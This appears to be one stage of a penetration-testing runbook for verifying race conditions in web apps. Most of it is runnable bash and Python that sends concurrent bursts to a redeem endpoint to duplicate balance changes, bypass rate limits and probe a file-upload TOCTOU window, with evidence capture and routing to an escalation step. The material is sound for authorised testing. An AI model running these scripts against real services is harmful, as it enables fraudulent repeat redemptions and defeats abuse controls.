# Race Condition — Runbook 03: Verify

## Purpose
Confirm with high confidence a race condition exists. Verify that concurrent requests produce duplicate state changes beyond the intended limit.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — authenticated cookie jar
- `$EVIDENCE_DIR` — evidence directory

---

## W3.1 — Verify duplicate state changes (high-precision concurrent send)

```bash
TARGET_ENDPOINT="$TARGET_URL/api/redeem"
EVIDENCE_DIR="$OUTDIR/race/evidence"

mkdir -p "$EVIDENCE_DIR"

# Step 1: Capture pre-state
curl -s "$TARGET_URL/api/balance" ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  > "$EVIDENCE_DIR/pre-balance.txt"
echo "=== Pre-state ==="
cat "$EVIDENCE_DIR/pre-balance.txt"

# Step 2: Send 20 concurrent requests
python3 -c "
import urllib.request, concurrent.futures, json, time, sys

url = '$TARGET_ENDPOINT'
cookie = open('$COOKIE_JAR').read().strip() if '$COOKIE_JAR' else ''
results = []

def send(i):
    start = time.time()
    try:
        req = urllib.request.Request(url, method='POST')
        if cookie:
            req.add_header('Cookie', cookie)
        req.add_header('Content-Type', 'application/json')
        resp = urllib.request.urlopen(req, timeout=15)
        body = resp.read().decode()
        status = resp.status
    except Exception as e:
        body = str(e)
        status = 0
    elapsed = time.time() - start
    results.append({'id': i, 'status': status, 'body': body[:500], 'time': elapsed})
    return results[-1]

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    list(ex.map(send, range(20)))

for r in sorted(results, key=lambda x: x['id']):
    print(f\"Request {r['id']}: {r['status']} ({r['time']:.3f}s) -> {r['body'][:100]}\")
" > "$EVIDENCE_DIR/concurrent-verify.txt"

# Step 3: Capture post-state
sleep 2
curl -s "$TARGET_URL/api/balance" ${COOKIE_JAR:+-b "$COOKIE_JAR"} \
  > "$EVIDENCE_DIR/post-balance.txt"
echo ""
echo "=== Post-state ==="
cat "$EVIDENCE_DIR/post-balance.txt"

# Step 4: Compute state delta
echo ""
echo "=== State Delta ==="
python3 -c "
import json, re
pre = open('$EVIDENCE_DIR/pre-balance.txt').read()
post = open('$EVIDENCE_DIR/post-balance.txt').read()
print('PRE:', pre.strip()[:200])
print('POST:', post.strip()[:200])
nums_pre = re.findall(r'[\d.,]+', pre)
nums_post = re.findall(r'[\d.,]+', post)
print('NUMBERS PRE:', nums_pre)
print('NUMBERS POST:', nums_post)
"
```

## W3.2 — Timing refinement (burst tuning)

```bash
echo "=== Burst Timing Test ===" > "$EVIDENCE_DIR/burst-timing.txt"

BURST_SIZES="5 10 20 50"

for burst in $BURST_SIZES; do
  echo "--- Burst size: $burst ---"
  python3 -c "
import urllib.request, concurrent.futures, time
url = '$TARGET_URL/api/redeem'
def send(i):
    start = time.time()
    try:
        resp = urllib.request.urlopen(urllib.request.Request(url))
        status = resp.status
    except:
        status = 'ERR'
    return status
with concurrent.futures.ThreadPoolExecutor(max_workers=$burst) as ex:
    results = list(ex.map(send, range($burst)))
success = sum(1 for r in results if r == 200)
print(f'Success: {success}/{$burst}')
" 2>/dev/null
  sleep 1
done | tee -a "$EVIDENCE_DIR/burst-timing.txt"
```

## W3.3 — Verify rate limit bypass via concurrency

```bash
echo "=== Rate Limit Bypass Verification ===" > "$EVIDENCE_DIR/rate-limit-bypass.txt"

python3 -c "
import urllib.request, concurrent.futures, time

url = '$TARGET_URL/api/redeem'
results = []

def send(i):
    try:
        req = urllib.request.Request(url, method='POST')
        resp = urllib.request.urlopen(req, timeout=10)
        return (i, resp.status)
    except Exception as e:
        return (i, str(e))

with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
    futures = [ex.submit(send, i) for i in range(30)]
    for f in concurrent.futures.as_completed(futures):
        results.append(f.result())

results.sort()
statuses = {}
for i, s in results:
    statuses[s] = statuses.get(s, 0) + 1
    print(f'Req {i}: {s}')

print(f'\\nSummary: {statuses}')
success_count = statuses.get(200, 0)
if success_count > 5:
    print(f'RATE LIMIT BYPASSED: {success_count} of 30 requests succeeded concurrently')
" | tee -a "$EVIDENCE_DIR/rate-limit-bypass.txt"
```

## W3.4 — TOCTOU verify (file upload + concurrent read)

```bash
echo "=== TOCTOU Verification ===" > "$EVIDENCE_DIR/toctou-verify.txt"

# Quick upload + concurrent read test
UPLOAD_URL="$TARGET_URL/api/upload"

python3 -c "
import urllib.request, concurrent.futures, time, io, uuid

upload_url = '$UPLOAD_URL'
data = f'test-content-{uuid.uuid4()}'.encode()

# Upload
req = urllib.request.Request(upload_url, data=data, method='POST')
req.add_header('Content-Type', 'text/plain')
resp = urllib.request.urlopen(req, timeout=10)
file_id = resp.read().decode().strip()
print(f'Uploaded file ID: {file_id}')

# Concurrently upload new version + read old version
def upload_new(i):
    new_data = f'new-content-{uuid.uuid4()}'.encode()
    req2 = urllib.request.Request(upload_url, data=new_data, method='POST')
    urllib.request.urlopen(req2, timeout=10)
    return f'upload_{i} done'

def read_file(i):
    req3 = urllib.request.Request(f'$TARGET_URL/api/files/{file_id}')
    try:
        resp = urllib.request.urlopen(req3, timeout=10)
        return f'read_{i}: {resp.read().decode()[:80]}'
    except:
        return f'read_{i}: ERROR'

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    f1 = [ex.submit(upload_new, i) for i in range(3)]
    f2 = [ex.submit(read_file, i) for i in range(3)]
    for f in concurrent.futures.as_completed(f1 + f2):
        print(f.result())
" | tee -a "$EVIDENCE_DIR/toctou-verify.txt"
```

---

## Stop Conditions

| Condition | Reason |
|---|---|
| 0 of N concurrent requests succeed | Proper locking / serialization |
| State delta matches single-operation effect | Race exists but only one wins |
| Rate limit enforced across all concurrent attempts | Global rate limiting working |
| All responses include unique nonce/request-id that's validated | Request deduplication working |

---

## Next Routing

| Result | Route |
|---|---|
| Multiple concurrent successes confirmed (state delta > 1x) | -> 04-impact-escalation.md |
| Rate limit bypass confirmed | -> 04-impact-escalation.md |
| TOCTOU confirmed | -> 04-impact-escalation.md |
| Inconclusive (some success, unclear state) | -> 06-false-positive-filter.md |

---

## Output Files

| File | Contents |
|---|---|
| $EVIDENCE_DIR/pre-balance.txt | Balance/state before concurrent test |
| $EVIDENCE_DIR/post-balance.txt | Balance/state after concurrent test |
| $EVIDENCE_DIR/concurrent-verify.txt | 20-thread concurrent request results |
| $EVIDENCE_DIR/burst-timing.txt | Burst size vs success rate |
| $EVIDENCE_DIR/rate-limit-bypass.txt | Rate limit bypass verification |
| $EVIDENCE_DIR/toctou-verify.txt | TOCTOU concurrent upload/read |
